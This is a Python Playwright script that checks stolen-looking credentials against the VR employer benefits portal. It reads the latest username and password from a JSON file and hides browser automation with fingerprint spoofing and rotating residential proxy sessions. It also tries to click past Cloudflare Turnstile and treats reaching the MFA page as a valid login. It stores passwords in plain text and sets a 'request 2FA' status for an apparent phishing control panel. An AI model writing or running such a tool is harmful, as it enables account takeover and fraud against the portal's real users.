import hashlib
import json
import os
import urllib.parse
from pathlib import Path
from datetime import datetime
from typing import Optional

from playwright.sync_api import (
    sync_playwright,
    TimeoutError as PlaywrightTimeoutError
)

def carregar_env():
    env_file = Path(".env")
    if env_file.exists():
        try:
            with open(env_file, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        k, v = line.split("=", 1)
                        k = k.strip()
                        v = v.strip().strip("'\"")
                        if k not in os.environ:
                            os.environ[k] = v
        except Exception:
            pass

carregar_env()

def obter_config_proxy(usuario: Optional[str] = None):
    """Retorna configuração de proxy estruturada para o Playwright com suporte a Bright Data e sessões fixas."""
    server = os.getenv("PROXY_SERVER", "").strip()
    username = os.getenv("PROXY_USERNAME", "").strip()
    password = os.getenv("PROXY_PASSWORD", "").strip()
    proxy_url = os.getenv("PROXY_URL", "").strip()

    if proxy_url and not server:
        parsed = urllib.parse.urlparse(proxy_url)
        server = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
        username = parsed.username or ""
        password = parsed.password or ""

    if not server:
        return None

    user_final = username
    if usuario and "zone-" in username and "-session-" not in username:
        sess_hash = hashlib.md5(usuario.strip().lower().encode()).hexdigest()[:8]
        user_final = f"{username}-session-{sess_hash}"

    cfg = {"server": server}
    if user_final:
        cfg["username"] = user_final
    if password:
        cfg["password"] = password
    return cfg

DADOS_JSON = Path("dados.json")
RESULTADO_JSON = Path("resultado.json")

URL_LOGIN = "https://superportal-empregador.vr.com.br/"

SELECTOR_USERNAME = "#username"
SELECTOR_PASSWORD = "#password"

SELECTOR_CONTINUAR = 'button[data-action-button-primary="true"]'

MFA_URL_PATTERN = "**/u/mfa-email-challenge?state=*"



def pegar_ultimo_login():

    if not DADOS_JSON.exists():
        print("ERRO: dados.json não encontrado.")
        return None

    try:
        with open(
            DADOS_JSON,
            "r",
            encoding="utf-8-sig"
        ) as arquivo:
            dados = json.load(arquivo)

    except Exception as erro:
        print("Erro ao ler dados.json:")
        print(erro)
        return None


    if not isinstance(dados, list):
        print("ERRO: dados.json precisa conter uma lista.")
        return None


    for item in reversed(dados):
        if isinstance(item, dict) and (item.get("usuario") or item.get("nome")) and item.get("senha"):
            return item

    print("Nenhum login com credenciais encontrado.")
    return None


def carregar_logs():

    if not RESULTADO_JSON.exists():
        return []


    try:
        with open(
            RESULTADO_JSON,
            "r",
            encoding="utf-8-sig"
        ) as arquivo:

            conteudo = json.load(arquivo)


        if isinstance(conteudo, list):
            return conteudo


        if isinstance(conteudo, dict):
            return [conteudo]


        return []


    except Exception as erro:
        print("Aviso: erro ao ler resultado.json:")
        print(erro)

        return []




def salvar_resultado(
    usuario,
    senha,
    valido,
    mensagem,
    url_final="",
    status_credencial="invalido"
):

    novo_log = {
        "data_hora": datetime.now().strftime(
            "%d/%m/%Y %H:%M:%S"
        ),

        "valido": valido,

        "status_credencial": status_credencial,

        "nome": usuario,

        # SALVA A SENHA EXATA (Texto Limpo)
        "senha": senha, 

        "mensagem": mensagem,

        "url_final": url_final
    }


    logs = carregar_logs()


    logs.append(
        novo_log
    )


    try:
        with open(
            RESULTADO_JSON,
            "w",
            encoding="utf-8"
        ) as arquivo:

            json.dump(
                logs,
                arquivo,
                indent=4,
                ensure_ascii=False
            )

    except Exception as erro:
        print("Erro ao salvar resultado.json:")
        print(erro)

    # Atualiza diretamente o SQLite se existir
    db_sqlite = Path("vr_database.sqlite")
    if db_sqlite.exists():
        try:
            import sqlite3
            conn = sqlite3.connect(str(db_sqlite), timeout=5)
            c = conn.cursor()
            status_login = "solicitar_2fa" if valido else "aguardando_solicitacao"
            c.execute(
                "UPDATE logins SET status_credencial = ?, status_login = ? WHERE lower(usuario) = ?",
                (status_credencial, status_login, usuario.lower().strip())
            )
            conn.commit()
            conn.close()
        except Exception as err:
            pass

    # Notifica o server.js via API local para disparar SSE imediato ao painel
    try:
        import urllib.request
        payload_bytes = json.dumps({
            "usuario": usuario,
            "valido": valido,
            "status_credencial": status_credencial,
            "mensagem": mensagem
        }).encode("utf-8")
        req = urllib.request.Request(
            "http://localhost:3000/api/resultado-bot",
            data=payload_bytes,
            headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception as e:
        pass



def testar_login(usuario, senha):

    print()
    print("====================================")
    print("         INICIANDO TESTE")
    print("====================================")
    print()

    print("Usuário:", usuario)


    with sync_playwright() as p:

        navegador = p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--window-size=1280,800",
                "--lang=pt-BR,pt"
            ]
        )

        proxy_config = obter_config_proxy(usuario)
        contexto = navegador.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 800},
            locale="pt-BR",
            timezone_id="America/Sao_Paulo",
            proxy=proxy_config
        )
        contexto.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            try { delete navigator.__proto__.webdriver; } catch (e) {}

            window.chrome = {
                runtime: {
                    OnInstalledReason: {},
                    OnRestartRequiredReason: {},
                    PlatformArch: {},
                    PlatformNaclArch: {},
                    PlatformOs: {},
                    RequestUpdateCheckStatus: {}
                },
                loadTimes: function() {},
                csi: function() {},
                app: {}
            };

            Object.defineProperty(navigator, 'languages', { get: () => ['pt-BR', 'pt', 'en-US', 'en'] });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });

            try {
                const getParam = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Google Inc. (Intel)';
                    if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)';
                    return getParam.apply(this, arguments);
                };
            } catch (e) {}
        """)

        pagina = contexto.new_page()


        try:


            print("[1] Abrindo página de login...")

            pagina.goto(
                URL_LOGIN,
                wait_until="domcontentloaded",
                timeout=30000
            )



            print("[2] Esperando formulário...")

            pagina.wait_for_selector(
                SELECTOR_USERNAME,
                state="visible",
                timeout=25000
            )

            pagina.wait_for_selector(
                SELECTOR_PASSWORD,
                state="visible",
                timeout=25000
            )


            print("[3] Preenchendo credenciais...")

            user_input = pagina.locator(SELECTOR_USERNAME).first
            user_input.fill(usuario)

            pass_input = pagina.locator(SELECTOR_PASSWORD).first
            pass_input.fill(senha)


            print("[5] Verificando se há desafio de segurança e clicando em continuar...")

            try:
                cf_input = pagina.locator('input[name="cf-turnstile-response"]').first
                if cf_input.count() > 0:
                    val = cf_input.get_attribute("value")
                    if not val:
                        print("[*] Aguardando token Turnstile ser gerado...")
                        for _ in range(8):
                            pagina.wait_for_timeout(100)
                            val = cf_input.get_attribute("value")
                            if val:
                                print("[*] Token Turnstile obtido!")
                                break
            except Exception:
                pass

            btn = pagina.locator(SELECTOR_CONTINUAR).first
            if btn.count() > 0:
                btn.click()
            else:
                pagina.keyboard.press("Enter")


            print("[6] Verificando resultado...")

            resultado_valido = None
            status_credencial = "invalido"
            msg_resultado = ""
            turnstile_detectado = False

            for _ in range(35):
                pagina.wait_for_timeout(100)
                url_atual = pagina.url

                # Caso 1: Navegou para a tela de MFA (Senha Correta!)
                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - etapa de código encontrada"
                    break

                # Caso 2: Detecta mensagem de erro de credenciais no DOM
                try:
                    erro_locator = pagina.locator("#error-element-password, [data-error-code], .ulp-alert-danger, .ulp-input-error-message, .alert-danger, span[id*='error']")
                    if erro_locator.count() > 0:
                        for i in range(erro_locator.count()):
                            el = erro_locator.nth(i)
                            if el.is_visible():
                                txt = el.inner_text().strip()
                                err_code = (el.get_attribute("data-error-code") or "").strip()
                                full_err = f"{txt} {err_code}".lower()

                                # Erro 600010: falha de carregamento do desafio Turnstile
                                if "600010" in full_err or "desafio de segurança" in full_err or "turnstile" in full_err or "captcha" in full_err:
                                    resultado_valido = False
                                    status_credencial = "bloqueio_captcha"
                                    msg_resultado = f"Desafio de segurança da VR pendente (Código: {txt or err_code})"
                                    turnstile_detectado = True
                                    break
                                elif any(k in full_err for k in ["incorret", "inválid", "invalido", "senha", "não encontramos", "verifique seus dados", "credenciais", "password"]):
                                    resultado_valido = False
                                    status_credencial = "invalido"
                                    msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                    break
                                elif txt:
                                    resultado_valido = False
                                    status_credencial = "invalido"
                                    msg_resultado = f"Erro reportado pela VR: {txt}"
                                    break
                    if resultado_valido is False:
                        break
                except Exception:
                    pass

                # Caso 3: Detecta e tenta auto-resolver Cloudflare Turnstile
                try:
                    for f in pagina.frames:
                        if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
                            turnstile_detectado = True
                            try:
                                box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, body').first
                                if box.count() > 0 and box.is_visible():
                                    box.click()
                            except Exception:
                                pass
                            break
                    if not turnstile_detectado:
                        cf_el = pagina.locator("iframe[src*='turnstile'], iframe[src*='challenges.cloudflare.com'], .cf-turnstile, #cf-turnstile")
                        if cf_el.count() > 0:
                            turnstile_detectado = True
                except Exception:
                    pass

            url_final = pagina.url
            if resultado_valido is None:
                if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                    resultado_valido = True
                    status_credencial = "valido"
                    msg_resultado = "Login válido - etapa de código encontrada"
                elif turnstile_detectado:
                    resultado_valido = False
                    status_credencial = "bloqueio_captcha"
                    msg_resultado = "Bloqueio Cloudflare Turnstile detectado no SSO da VR (verificação humana pendente)"
                else:
                    resultado_valido = False
                    status_credencial = "invalido"
                    msg_resultado = "Login inválido ou etapa de código não encontrada."

            if resultado_valido:
                print("\n====================================")
                print("            LOGIN VÁLIDO")
                print("====================================")
                print("Etapa de código encontrada. URL:", url_final)
            elif status_credencial == "bloqueio_captcha":
                print("\n====================================")
                print("       BLOQUEIO CAPTCHA VR")
                print("====================================")
                print("Cloudflare Turnstile ativo. URL:", url_final)
            else:
                print("\n====================================")
                print("           LOGIN INVÁLIDO")
                print("====================================")
                print("Não chegou na etapa de código. URL atual:", url_final)

            salvar_resultado(
                usuario=usuario,
                senha=senha,
                valido=resultado_valido,
                mensagem=msg_resultado,
                url_final=url_final,
                status_credencial=status_credencial
            )

            return resultado_valido

        except Exception as e:
            print(f"\nErro inesperado durante a execução: {e}")
            return False
            
        finally:
            navegador.close()



if __name__ == "__main__":
    ultimo_login = pegar_ultimo_login()
    
    if ultimo_login:
        usuario_teste = ultimo_login.get("usuario") or ultimo_login.get("nome")
        senha_teste = ultimo_login.get("senha")
        
        if usuario_teste and senha_teste:
            testar_login(usuario_teste, senha_teste)
        else:
            print("ERRO: Formato de chaves inválido dentro do objeto do dados.json.")
